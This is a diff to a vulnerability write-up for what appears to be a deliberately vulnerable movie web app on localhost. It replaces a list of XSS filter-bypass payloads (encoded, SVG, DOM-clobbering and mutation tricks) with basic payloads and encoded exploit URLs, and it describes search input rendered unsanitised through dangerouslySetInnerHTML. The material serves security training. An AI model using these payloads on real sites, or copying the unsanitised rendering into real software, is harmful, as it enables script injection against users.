@@ -110,71 +110,39 @@ curl -X POST http://localhost:5001/api/user/upload \
 
 ## 3. Cross-Site Scripting (XSS)
 
-### 3.1 Reflected XSS in Search (Complex Bypass Required)
+### 3.1 Reflected XSS in Search
 **Location**: `src/components/Movies.tsx` - Line 65-85  
 **Severity**: High  
-**Description**: Search query rendered with incomplete XSS filtering that can be bypassed.
+**Description**: Search query rendered directly without any sanitization using dangerouslySetInnerHTML.
 
-**Basic payloads blocked**:
-- `<script>alert(1)</script>` → Filtered
-- `javascript:alert(1)` → Filtered  
-- `onload=alert(1)` → Filtered
-
-**Complex bypass payloads**:
+**Basic payloads that work**:
 ```javascript
-// SVG-based XSS
-<svg/onload=confirm(1)>
+// Basic script injection
+<script>alert('XSS')</script>
 
-// Data URI bypass
-<iframe src="data:text/html,<scr1pt>alert(document.domain)</scr1pt>">
+// Image onerror
+<img src=x onerror=alert(1)>
 
-// Template literal bypass
-<img src=x onerror=`${String.fromCharCode(97,108,101,114,116)}(1)`>
+// SVG onload
+<svg onload=alert(1)>
 
-// Unicode bypass
-<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>
-
-// HTML entity bypass
-<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
-
-// CSS expression bypass (IE)
-<div style="x:expression(alert(1))">
-
-// Nested encoding bypass
-<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))">
-
-// DOM clobbering + XSS
-<form id=x><input name=innerHTML><img src=x onerror=x.innerHTML=String.fromCharCode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,49,41,60,47,115,99,114,105,112,116,62)>
-
-// Mutation XSS
-<noscript><p title="</noscript><img src=x onerror=alert(1)>">
-
-// Filter evasion with comments
-<img src=x onerror=al/**/ert(1)>
-
-// Case variation bypass
-<IMG SRC=x ONERROR=ALERT(1)>
-
-// Attribute injection
-<input type=image src=x onerror=prompt(1)>
+// Input onfocus
+<input onfocus=alert(1) autofocus>
 ```
 
-**Advanced exploitation**:
+**Exploitation**:
 ```bash
-# URL encode the payload
-http://localhost:5173/movies?search=%3Csvg%2Fonload%3Dconfirm%281%29%3E
+# Basic script tag
+http://localhost:5173/movies?search=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
 
-# Double encoding
-http://localhost:5173/movies?search=%253Csvg%252Fonload%253Dconfirm%25281%2529%253E
+# Image with onerror
+http://localhost:5173/movies?search=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E
 
-# Mixed case + encoding
-http://localhost:5173/movies?search=%3CiMg%20sRc%3Dx%20OnErRoR%3Dalert%281%29%3E
+# SVG with onload
+http://localhost:5173/movies?search=%3Csvg%20onload%3Dalert%281%29%3E
 
-# Working payload (SVG XSS)
-http://localhost:5173/movies?search=%3Csvg%2Fonload%3Dconfirm%281%29%3E
-
-# Alternative working payload (IMG XSS with unicode)
-http://localhost:5173/movies?search=%3Cimg%20src%3Dx%20onerror%3D%5Cu0061%5Cu006c%5Cu0065%5Cu0072%5Cu0074%281%29%3E
+# Input with autofocus
+http://localhost:5173/movies?search=%3Cinput%20onfocus%3Dalert%281%29%20autofocus%3E
 ```
 
 ### 3.2 Stored XSS in Reviews
